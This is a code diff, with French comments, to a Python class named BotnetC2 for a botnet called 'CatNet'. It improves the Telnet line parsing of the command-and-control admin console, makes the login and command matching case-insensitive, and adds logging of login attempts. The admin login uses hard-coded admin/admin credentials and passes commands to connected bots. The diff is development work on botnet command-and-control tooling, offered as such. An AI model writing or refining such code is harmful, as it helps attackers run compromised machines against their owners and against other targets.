@@ -148,23 +148,45 @@ class BotnetC2:
             sys.exit(0)
 
     def read_line(self, sock):
-        """Lit une ligne depuis le socket Telnet en gérant les retours à la ligne divers."""
+        """Lit une ligne depuis le socket Telnet en ignorant les commandes IAC et en gérant \\r\\n."""
         line = b""
         while True:
             try:
                 char = sock.recv(1)
                 if not char: return None
+                
+                # Gérer les commandes Telnet (IAC)
+                if char == b"\xff": # IAC
+                    cmd = sock.recv(1)
+                    if cmd in [b"\xfb", b"\xfc", b"\xfd", b"\xfe"]: # WILL, WON'T, DO, DON'T
+                        sock.recv(1) # Ignorer l'option
+                    continue
+                
                 if char == b"\n": break
-                if char == b"\r": continue
+                if char == b"\r": 
+                    # Regarder si le prochain est \n ou \0
+                    sock.setblocking(False)
+                    try:
+                        next_char = sock.recv(1)
+                        if next_char != b"\n" and next_char != b"\0":
+                            line += next_char
+                    except: pass
+                    sock.setblocking(True)
+                    break
+                
                 line += char
             except: return None
-        return line.decode('utf-8', errors='ignore').strip()
+        
+        # Décoder et nettoyer agressivement
+        result = line.decode('utf-8', errors='ignore').strip()
+        # Supprimer tout caractère non-imprimable restant
+        return "".join(c for c in result if c.isprintable())
 
     def handle_admin(self, admin_socket, address):
         try:
-            # Désactiver l'écho local Telnet (pour que le serveur gère l'affichage si besoin)
-            # IAC WILL ECHO (255 251 1)
-            admin_socket.send(bytes([255, 251, 1]))
+            # Forcer le mode caractère et désactiver l'écho local
+            # IAC WILL ECHO, IAC WILL SUPPRESS GO AHEAD
+            admin_socket.send(bytes([255, 251, 1, 255, 251, 3]))
             
             admin_socket.send(b"\r\nCatNet Admin Login: ")
             login = self.read_line(admin_socket)
@@ -174,7 +196,10 @@ class BotnetC2:
             password = self.read_line(admin_socket)
             if password is None: return
             
-            if login == "admin" and password == "admin":
+            # Log de débogage interne (ne pas envoyer au client)
+            self.log(f"Tentative login admin: '{login}' depuis {address[0]}")
+            
+            if login.lower() == "admin" and password == "admin":
                 admin_socket.send(b"\r\nWelcome to CatNet C2 Admin Interface\r\n")
                 admin_socket.send(b"Type 'help' for commands or 'logout' to exit.\r\n")
                 
@@ -182,8 +207,8 @@ class BotnetC2:
                     admin_socket.send(f"\r\n[Bots: {len(self.connected_bots)}] admin> ".encode())
                     data = self.read_line(admin_socket)
                     if not data: break
-                    if data == "logout": break
-                    if data == "exit": 
+                    if data.lower() == "logout": break
+                    if data.lower() == "exit": 
                         self.running = False
                         sys.exit(0)
                     
@@ -195,9 +220,10 @@ class BotnetC2:
                     self.process_command(cmd, output)
                     admin_socket.send(output.getvalue().replace("\n", "\r\n").encode())
             else:
-                admin_socket.send(b"Login failed.\r\n")
+                self.log(f"Login échoué pour {address[0]} (Login: {login})", "WARN")
+                admin_socket.send(b"\r\nLogin failed. Session closed.\r\n")
         except Exception as e:
-            self.log(f"Erreur session admin: {e}", "ERROR")
+            self.log(f"Erreur session admin {address[0]}: {e}", "ERROR")
         finally:
             admin_socket.close()
 
